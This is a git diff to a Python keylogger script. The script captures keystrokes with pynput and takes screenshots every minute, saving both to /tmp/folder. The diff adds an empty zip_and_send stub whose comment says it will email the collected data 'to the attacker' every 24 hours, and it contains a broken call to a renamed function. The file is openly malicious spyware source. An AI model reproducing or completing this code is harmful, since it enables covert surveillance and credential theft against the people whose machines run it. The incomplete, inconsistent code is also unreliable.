@@ -8,16 +8,29 @@ Date : 2020-02-09
 from pynput import keyboard
 import pyautogui as pygrab
 import threading
+import smtplib
+import zipfile
 import sys
 import os
 import time
 
 log = ''
 
+def main():
+	global log
+	directory, to_append = make_dir(), 'log_' + make_name()
+	save_screen()
+	zip_and_send(directory,to_append)
+	# start the keylogger
+	with keyboard.Listener(
+		on_press=on_press) as listener:
+		log_to_file()
+		listener.join()
+
 '''
 make directory in /tmp folder
 '''
-def make_dir():
+def make_get_dir():
 	try:
 		dir_to_create = "/tmp/folder/"
 		os.mkdir(dir_to_create)
@@ -48,7 +61,7 @@ Logging to a file every 5 seconds
 '''
 def log_to_file():
 	global log
-	f = open(make_dir() + 'log.txt', 'w')
+	f = open(make_get_dir() + 'log.txt', 'w')
 	f.write(log)
 	clock = threading.Timer(5, log_to_file)
 	clock.start()
@@ -57,7 +70,7 @@ def log_to_file():
 get time image was taken append it to 
 the name of the images file
 '''
-def make_image_name():
+def make_name():
 	seconds_since_epoch = time.time()
 	date = time.ctime(seconds_since_epoch).split()
 	return date[1] + '-' + date[2] + '-' + date[3]
@@ -68,20 +81,18 @@ every minute and save it to /tmp/folder directory
 '''
 def save_screen():
 	image = pygrab.screenshot()
-	time = make_image_name()
+	time = make_name()
 	image.save(r'/tmp/folder/normal_' + time + '.png')
 	take_screen = threading.Timer(60, save_screen)
 	take_screen.start()
 
-
-def main():
-	global log
-	make_dir()
-	save_screen()
-	# start the keylogger
-	with keyboard.Listener(
-		on_press=on_press) as listener:
-		log_to_file()
-		listener.join()
-
-main()
+'''
+Zip the folder that was created and 
+email the zipped folder to the attacker
+'''
+def zip_and_send(direc, zip_name):
+	# create zipped file and send every 24 hrs!!!!
+		     
+	
+if __name__ == '__main__':
+	main()
